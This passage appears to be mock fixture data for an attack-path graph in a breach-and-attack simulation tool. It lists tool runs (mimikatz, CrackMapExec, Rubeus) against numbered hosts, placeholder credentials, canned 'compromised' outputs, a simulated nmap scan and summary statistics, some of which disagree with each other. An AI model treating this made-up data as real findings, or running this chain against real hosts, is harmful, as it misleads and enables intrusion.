      node_expectations:[{expectation_id:'s550EP-e43',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a45', node_type:'ACTION', node_label:'mimikatz-sekurlsa → SIEM-45',
      node_status:'undetected', node_hostname:'SIEM-45', node_ip:'10.10.3.54',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:42:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → SIEM-45 (10.10.3.54)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\siem45:P@ss45!'],
      node_accessed_files:['C:\\Logs\\SIEM-45-audit.log'],
    },
    { node_id:'s550EP-a46', node_type:'ACTION', node_label:'CrackMapExec → WEB-46',
      node_status:'detected', node_hostname:'WEB-46', node_ip:'10.10.3.55',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 11:48:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → WEB-46 (10.10.3.55)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\web46:P@ss46!'],
      node_accessed_files:['C:\\Logs\\WEB-46-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e45',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a47', node_type:'ACTION', node_label:'nmap-discovery → APP-47',
      node_status:'undetected', node_hostname:'APP-47', node_ip:'10.10.3.56',
      node_payload_name:'nmap-discovery', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 11:51:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → APP-47 (10.10.3.56)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app47:P@ss47!'],
      node_accessed_files:['C:\\Logs\\APP-47-audit.log'],
    },
    { node_id:'s550EP-a48', node_type:'ACTION', node_label:'wdigest-dump → DB-48',
      node_status:'detected', node_hostname:'DB-48', node_ip:'10.10.3.57',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:56:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] wdigest-dump → DB-48 (10.10.3.57)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\db48:P@ss48!'],
      node_accessed_files:['C:\\Logs\\DB-48-audit.log'],
      node_expectations:[{expectation_id:'s550EP-e47',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s550EP-a49', node_type:'ACTION', node_label:'PowerView-recon → FILE-49',
      node_status:'undetected', node_hostname:'FILE-49', node_ip:'10.10.3.58',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 12:03:00 UTC', node_agent:'openaev',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for MONITOR-49 (10.10.3.48)
Host is up (0.003s latency).
161/udp  open  snmp
8080/tcp open  http-proxy
9090/tcp open  zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\file49:P@ss49!'],
      node_accessed_files:['C:\\Logs\\FILE-49-audit.log'],
    },
    { node_id:'s550EP-a50', node_type:'ACTION', node_label:'Rubeus-asktgt → MAIL-50',
      node_status:'undetected', node_hostname:'MAIL-50', node_ip:'10.10.3.59',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 12:06:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → MAIL-50 (10.10.3.59)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail50:P@ss50!'],
      node_accessed_files:['C:\\Logs\\MAIL-50-audit.log'],
    },
    {
      node_id: 's550EP-a-nmap-bulk', node_type: 'ACTION', node_label: 'Nmap Full-Network Discovery',
      node_status: 'undetected', node_ip: '0.0.0.0/0',
      node_payload_name: 'nmap – TCP SYN Scan (full network)',
      node_executed_at: '2026-05-20 07:55:00 UTC',
      node_agent: 'openaev',
      node_terminal_output: `Starting Nmap 7.94 at 2026-05-20 07:55 UTC
Nmap scan report for 172.16.0.10 (WEB-01)
HOST: up
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 172.16.0.11 (APP-02)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 172.16.0.12 (DB-03)
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 172.16.0.13 (FILE-04)
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 172.16.0.14 (MAIL-05)
HOST: up
25/tcp  open  smtp
22/tcp  open  ssh

Nmap scan report for 172.16.0.15 (JUMP-06)
HOST: up
22/tcp  open  ssh
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.0.16 (PRINT-07)
HOST: up
135/tcp open  msrpc
9100/tcp open  jetdirect

Nmap scan report for 172.16.0.17 (DNS-08)
HOST: up
53/tcp  open  domain
22/tcp  open  ssh

Nmap scan report for 172.16.0.18 (DC-09)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.19 (WS-10)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.20 (API-11)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 172.16.0.21 (BACKUP-12)
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 172.16.0.22 (MONITOR-13)
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.1.63 (VPN-14)
HOST: up
1194/tcp open  openvpn
135/tcp  open  msrpc

Nmap scan report for 10.10.1.64 (SIEM-15)
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap scan report for 10.10.1.65 (WEB-16)
HOST: up
22/tcp  open  ssh
80/tcp  open  http

Nmap scan report for 10.10.1.66 (APP-17)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.1.67 (DB-18)
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.1.68 (FILE-19)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.69 (MAIL-20)
HOST: up
25/tcp  open  smtp
22/tcp  open  ssh

Nmap scan report for 10.10.1.70 (JUMP-21)
HOST: up
22/tcp  open  ssh
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.1.71 (PRINT-22)
HOST: up
135/tcp open  msrpc
9100/tcp open  jetdirect

Nmap scan report for 10.10.1.72 (DNS-23)
HOST: up
53/tcp  open  domain
22/tcp  open  ssh

Nmap scan report for 10.10.1.73 (DC-24)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.74 (WS-25)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.35 (API-26)
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 10.10.2.36 (BACKUP-27)
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.2.37 (MONITOR-28)
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.2.38 (VPN-29)
HOST: up
1194/tcp open  openvpn
22/tcp  open  ssh

Nmap scan report for 10.10.2.39 (SIEM-30)
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap scan report for 10.10.2.40 (WEB-31)
HOST: up
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 10.10.2.41 (APP-32)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.2.42 (DB-33)
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.10.2.43 (FILE-34)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.44 (MAIL-35)
HOST: up
25/tcp  open  smtp
143/tcp open  imap

Nmap scan report for 10.10.2.45 (JUMP-36)
HOST: up
22/tcp  open  ssh
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.2.46 (PRINT-37)
HOST: up
135/tcp open  msrpc
9100/tcp open  jetdirect

Nmap scan report for 10.10.2.47 (DNS-38)
HOST: up
53/tcp  open  domain
135/tcp open  msrpc

Nmap scan report for 10.10.3.48 (DC-39)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.10.3.49 (WS-40)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.3.50 (API-41)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.3.51 (BACKUP-42)
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.3.52 (MONITOR-43)
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.3.53 (VPN-44)
HOST: up
1194/tcp open  openvpn
135/tcp  open  msrpc

Nmap scan report for 10.10.3.54 (SIEM-45)
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap scan report for 10.10.3.55 (WEB-46)
HOST: up
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 10.10.3.56 (APP-47)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.3.57 (DB-48)
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.10.3.58 (FILE-49)
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 10.10.3.59 (MAIL-50)
HOST: up
25/tcp  open  smtp
143/tcp open  imap

Nmap done: 254 IP addresses (50 hosts up) scanned in 56.2 seconds`,
    },
  ],
  attack_path_edges:[
    {edge_id:'s550EP-c01',edge_source:'s550EP-a01',edge_target:'s550EP-a02',edge_type:'chain_flow', edge_label:'foothold → lateral'},
    {edge_id:'s550EP-c02',edge_source:'s550EP-a02',edge_target:'s550EP-a03',edge_type:'chain_flow'},
    {edge_id:'s550EP-c03',edge_source:'s550EP-a03',edge_target:'s550EP-a04',edge_type:'chain_flow'},
    {edge_id:'s550EP-c04',edge_source:'s550EP-a04',edge_target:'s550EP-a05',edge_type:'chain_flow'},
    {edge_id:'s550EP-c05',edge_source:'s550EP-a05',edge_target:'s550EP-a06',edge_type:'chain_flow'},
    {edge_id:'s550EP-c06',edge_source:'s550EP-a06',edge_target:'s550EP-a07',edge_type:'chain_flow'},
    {edge_id:'s550EP-c07',edge_source:'s550EP-a07',edge_target:'s550EP-a08',edge_type:'chain_flow'},
    {edge_id:'s550EP-c08',edge_source:'s550EP-a08',edge_target:'s550EP-a09',edge_type:'chain_flow'},
    {edge_id:'s550EP-c09',edge_source:'s550EP-a09',edge_target:'s550EP-a10',edge_type:'chain_flow'},
    {edge_id:'s550EP-c10',edge_source:'s550EP-a10',edge_target:'s550EP-a11',edge_type:'chain_flow'},
    {edge_id:'s550EP-c11',edge_source:'s550EP-a11',edge_target:'s550EP-a12',edge_type:'chain_flow'},
    {edge_id:'s550EP-c12',edge_source:'s550EP-a12',edge_target:'s550EP-a13',edge_type:'chain_flow'},
    {edge_id:'s550EP-c13',edge_source:'s550EP-a13',edge_target:'s550EP-a14',edge_type:'chain_flow'},
    {edge_id:'s550EP-c14',edge_source:'s550EP-a14',edge_target:'s550EP-a15',edge_type:'chain_flow'},
    {edge_id:'s550EP-c15',edge_source:'s550EP-a15',edge_target:'s550EP-a16',edge_type:'chain_flow'},
    {edge_id:'s550EP-c16',edge_source:'s550EP-a16',edge_target:'s550EP-a17',edge_type:'chain_flow'},
    {edge_id:'s550EP-c17',edge_source:'s550EP-a17',edge_target:'s550EP-a18',edge_type:'chain_flow'},
    {edge_id:'s550EP-c18',edge_source:'s550EP-a18',edge_target:'s550EP-a19',edge_type:'chain_flow'},
    {edge_id:'s550EP-c19',edge_source:'s550EP-a19',edge_target:'s550EP-a20',edge_type:'chain_flow'},
    {edge_id:'s550EP-c20',edge_source:'s550EP-a20',edge_target:'s550EP-a21',edge_type:'chain_flow'},
    {edge_id:'s550EP-c21',edge_source:'s550EP-a21',edge_target:'s550EP-a22',edge_type:'chain_flow'},
    {edge_id:'s550EP-c22',edge_source:'s550EP-a22',edge_target:'s550EP-a23',edge_type:'chain_flow'},
    {edge_id:'s550EP-c23',edge_source:'s550EP-a23',edge_target:'s550EP-a24',edge_type:'chain_flow'},
    {edge_id:'s550EP-c24',edge_source:'s550EP-a24',edge_target:'s550EP-a25',edge_type:'chain_flow'},
    {edge_id:'s550EP-c25',edge_source:'s550EP-a25',edge_target:'s550EP-a26',edge_type:'chain_flow'},
    {edge_id:'s550EP-c26',edge_source:'s550EP-a26',edge_target:'s550EP-a27',edge_type:'chain_flow'},
    {edge_id:'s550EP-c27',edge_source:'s550EP-a27',edge_target:'s550EP-a28',edge_type:'chain_flow'},
    {edge_id:'s550EP-c28',edge_source:'s550EP-a28',edge_target:'s550EP-a29',edge_type:'chain_flow'},
    {edge_id:'s550EP-c29',edge_source:'s550EP-a29',edge_target:'s550EP-a30',edge_type:'chain_flow'},
    {edge_id:'s550EP-c30',edge_source:'s550EP-a30',edge_target:'s550EP-a31',edge_type:'chain_flow'},
    {edge_id:'s550EP-c31',edge_source:'s550EP-a31',edge_target:'s550EP-a32',edge_type:'chain_flow'},
    {edge_id:'s550EP-c32',edge_source:'s550EP-a32',edge_target:'s550EP-a33',edge_type:'chain_flow'},
    {edge_id:'s550EP-c33',edge_source:'s550EP-a33',edge_target:'s550EP-a34',edge_type:'chain_flow'},
    {edge_id:'s550EP-c34',edge_source:'s550EP-a34',edge_target:'s550EP-a35',edge_type:'chain_flow'},
    {edge_id:'s550EP-c35',edge_source:'s550EP-a35',edge_target:'s550EP-a36',edge_type:'chain_flow'},
    {edge_id:'s550EP-c36',edge_source:'s550EP-a36',edge_target:'s550EP-a37',edge_type:'chain_flow'},
    {edge_id:'s550EP-c37',edge_source:'s550EP-a37',edge_target:'s550EP-a38',edge_type:'chain_flow'},
    {edge_id:'s550EP-c38',edge_source:'s550EP-a38',edge_target:'s550EP-a39',edge_type:'chain_flow'},
    {edge_id:'s550EP-c39',edge_source:'s550EP-a39',edge_target:'s550EP-a40',edge_type:'chain_flow'},
    {edge_id:'s550EP-c40',edge_source:'s550EP-a40',edge_target:'s550EP-a41',edge_type:'chain_flow'},
    {edge_id:'s550EP-c41',edge_source:'s550EP-a41',edge_target:'s550EP-a42',edge_type:'chain_flow'},
    {edge_id:'s550EP-c42',edge_source:'s550EP-a42',edge_target:'s550EP-a43',edge_type:'chain_flow'},
    {edge_id:'s550EP-c43',edge_source:'s550EP-a43',edge_target:'s550EP-a44',edge_type:'chain_flow'},
    {edge_id:'s550EP-c44',edge_source:'s550EP-a44',edge_target:'s550EP-a45',edge_type:'chain_flow'},
    {edge_id:'s550EP-c45',edge_source:'s550EP-a45',edge_target:'s550EP-a46',edge_type:'chain_flow'},
    {edge_id:'s550EP-c46',edge_source:'s550EP-a46',edge_target:'s550EP-a47',edge_type:'chain_flow'},
    {edge_id:'s550EP-c47',edge_source:'s550EP-a47',edge_target:'s550EP-a48',edge_type:'chain_flow'},
    {edge_id:'s550EP-c48',edge_source:'s550EP-a48',edge_target:'s550EP-a49',edge_type:'chain_flow'},
    {edge_id:'s550EP-c49',edge_source:'s550EP-a49',edge_target:'s550EP-a50',edge_type:'chain_flow'},
    {edge_id:'s550EP-al01',edge_source:'s550EP-a01',edge_target:'s550EP-ep01',edge_type:'asset_link'},
    {edge_id:'s550EP-al02',edge_source:'s550EP-a02',edge_target:'s550EP-ep02',edge_type:'asset_link'},
    {edge_id:'s550EP-al03',edge_source:'s550EP-a03',edge_target:'s550EP-ep03',edge_type:'asset_link'},
    {edge_id:'s550EP-al04',edge_source:'s550EP-a04',edge_target:'s550EP-ep04',edge_type:'asset_link'},
    {edge_id:'s550EP-al05',edge_source:'s550EP-a05',edge_target:'s550EP-ep05',edge_type:'asset_link'},
    {edge_id:'s550EP-al06',edge_source:'s550EP-a06',edge_target:'s550EP-ep06',edge_type:'asset_link'},
    {edge_id:'s550EP-al07',edge_source:'s550EP-a07',edge_target:'s550EP-ep07',edge_type:'asset_link'},
    {edge_id:'s550EP-al08',edge_source:'s550EP-a08',edge_target:'s550EP-ep08',edge_type:'asset_link'},
    {edge_id:'s550EP-al09',edge_source:'s550EP-a09',edge_target:'s550EP-ep09',edge_type:'asset_link'},
    {edge_id:'s550EP-al10',edge_source:'s550EP-a10',edge_target:'s550EP-ep10',edge_type:'asset_link'},
    {edge_id:'s550EP-al11',edge_source:'s550EP-a11',edge_target:'s550EP-ep11',edge_type:'asset_link'},
    {edge_id:'s550EP-al12',edge_source:'s550EP-a12',edge_target:'s550EP-ep12',edge_type:'asset_link'},
    {edge_id:'s550EP-al13',edge_source:'s550EP-a13',edge_target:'s550EP-ep13',edge_type:'asset_link'},
    {edge_id:'s550EP-al14',edge_source:'s550EP-a14',edge_target:'s550EP-ep14',edge_type:'asset_link'},
    {edge_id:'s550EP-al15',edge_source:'s550EP-a15',edge_target:'s550EP-ep15',edge_type:'asset_link'},
    {edge_id:'s550EP-al16',edge_source:'s550EP-a16',edge_target:'s550EP-ep16',edge_type:'asset_link'},
    {edge_id:'s550EP-al17',edge_source:'s550EP-a17',edge_target:'s550EP-ep17',edge_type:'asset_link'},
    {edge_id:'s550EP-al18',edge_source:'s550EP-a18',edge_target:'s550EP-ep18',edge_type:'asset_link'},
    {edge_id:'s550EP-al19',edge_source:'s550EP-a19',edge_target:'s550EP-ep19',edge_type:'asset_link'},
    {edge_id:'s550EP-al20',edge_source:'s550EP-a20',edge_target:'s550EP-ep20',edge_type:'asset_link'},
    {edge_id:'s550EP-al21',edge_source:'s550EP-a21',edge_target:'s550EP-ep21',edge_type:'asset_link'},
    {edge_id:'s550EP-al22',edge_source:'s550EP-a22',edge_target:'s550EP-ep22',edge_type:'asset_link'},
    {edge_id:'s550EP-al23',edge_source:'s550EP-a23',edge_target:'s550EP-ep23',edge_type:'asset_link'},
    {edge_id:'s550EP-al24',edge_source:'s550EP-a24',edge_target:'s550EP-ep24',edge_type:'asset_link'},
    {edge_id:'s550EP-al25',edge_source:'s550EP-a25',edge_target:'s550EP-ep25',edge_type:'asset_link'},
    {edge_id:'s550EP-al26',edge_source:'s550EP-a26',edge_target:'s550EP-ep26',edge_type:'asset_link'},
    {edge_id:'s550EP-al27',edge_source:'s550EP-a27',edge_target:'s550EP-ep27',edge_type:'asset_link'},
    {edge_id:'s550EP-al28',edge_source:'s550EP-a28',edge_target:'s550EP-ep28',edge_type:'asset_link'},
    {edge_id:'s550EP-al29',edge_source:'s550EP-a29',edge_target:'s550EP-ep29',edge_type:'asset_link'},
    {edge_id:'s550EP-al30',edge_source:'s550EP-a30',edge_target:'s550EP-ep30',edge_type:'asset_link'},
    {edge_id:'s550EP-al31',edge_source:'s550EP-a31',edge_target:'s550EP-ep31',edge_type:'asset_link'},
    {edge_id:'s550EP-al32',edge_source:'s550EP-a32',edge_target:'s550EP-ep32',edge_type:'asset_link'},
    {edge_id:'s550EP-al33',edge_source:'s550EP-a33',edge_target:'s550EP-ep33',edge_type:'asset_link'},
    {edge_id:'s550EP-al34',edge_source:'s550EP-a34',edge_target:'s550EP-ep34',edge_type:'asset_link'},
    {edge_id:'s550EP-al35',edge_source:'s550EP-a35',edge_target:'s550EP-ep35',edge_type:'asset_link'},
    {edge_id:'s550EP-al36',edge_source:'s550EP-a36',edge_target:'s550EP-ep36',edge_type:'asset_link'},
    {edge_id:'s550EP-al37',edge_source:'s550EP-a37',edge_target:'s550EP-ep37',edge_type:'asset_link'},
    {edge_id:'s550EP-al38',edge_source:'s550EP-a38',edge_target:'s550EP-ep38',edge_type:'asset_link'},
    {edge_id:'s550EP-al39',edge_source:'s550EP-a39',edge_target:'s550EP-ep39',edge_type:'asset_link'},
    {edge_id:'s550EP-al40',edge_source:'s550EP-a40',edge_target:'s550EP-ep40',edge_type:'asset_link'},
    {edge_id:'s550EP-al41',edge_source:'s550EP-a41',edge_target:'s550EP-ep41',edge_type:'asset_link'},
    {edge_id:'s550EP-al42',edge_source:'s550EP-a42',edge_target:'s550EP-ep42',edge_type:'asset_link'},
    {edge_id:'s550EP-al43',edge_source:'s550EP-a43',edge_target:'s550EP-ep43',edge_type:'asset_link'},
    {edge_id:'s550EP-al44',edge_source:'s550EP-a44',edge_target:'s550EP-ep44',edge_type:'asset_link'},
    {edge_id:'s550EP-al45',edge_source:'s550EP-a45',edge_target:'s550EP-ep45',edge_type:'asset_link'},
    {edge_id:'s550EP-al46',edge_source:'s550EP-a46',edge_target:'s550EP-ep46',edge_type:'asset_link'},
    {edge_id:'s550EP-al47',edge_source:'s550EP-a47',edge_target:'s550EP-ep47',edge_type:'asset_link'},
    {edge_id:'s550EP-al48',edge_source:'s550EP-a48',edge_target:'s550EP-ep48',edge_type:'asset_link'},
    {edge_id:'s550EP-al49',edge_source:'s550EP-a49',edge_target:'s550EP-ep49',edge_type:'asset_link'},
    {edge_id:'s550EP-al50',edge_source:'s550EP-a50',edge_target:'s550EP-ep50',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep01',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep01',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep02',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep02',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep03',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep03',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep04',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep04',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep05',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep05',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep06',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep06',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep07',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep07',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep08',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep08',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep09',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep09',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep10',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep10',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep11',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep11',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep12',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep12',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep13',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep13',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep14',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep14',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep15',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep15',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep16',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep16',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep17',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep17',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep18',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep18',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep19',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep19',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep20',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep20',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep21',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep21',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep22',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep22',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep23',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep23',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep24',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep24',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep25',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep25',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep26',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep26',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep27',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep27',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep28',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep28',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep29',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep29',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep30',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep30',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep31',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep31',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep32',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep32',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep33',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep33',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep34',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep34',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep35',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep35',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep36',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep36',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep37',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep37',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep38',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep38',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep39',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep39',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep40',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep40',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep41',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep41',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep42',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep42',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep43',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep43',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep44',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep44',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep45',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep45',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep46',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep46',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep47',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep47',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep48',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep48',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep49',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep49',edge_type:'asset_link'},
    {edge_id:'s550EP-nmap-ep50',edge_source:'s550EP-a-nmap-bulk',edge_target:'s550EP-ep50',edge_type:'asset_link'},
  ],
  attack_path_stats:{
    stats_prevented:5,stats_detected:13,stats_undetected:32,
    stats_pending:0,stats_total_actions:51,stats_executed_actions:51,
    stats_captured_endpoints:22,stats_captured_files:45,stats_captured_credentials:45,
stats_captured_users: 31,
stats_captured_cves: 20,
  },
  attack_path_definitions:[
    {path_id:'s550EP-p1',path_name:'Main Compromise Chain',path_color:'#e91e63',node_ids:['s550EP-ep01','s550EP-ep03','s550EP-ep05','s550EP-ep06','s550EP-ep08','s550EP-ep14','s550EP-ep16','s550EP-ep18','s550EP-ep19','s550EP-ep22','s550EP-ep26','s550EP-ep28','s550EP-ep31','s550EP-ep33','s550EP-ep35','s550EP-ep39','s550EP-ep43','s550EP-ep46','s550EP-ep49','s550EP-ep50'],path_outcome:'success'},
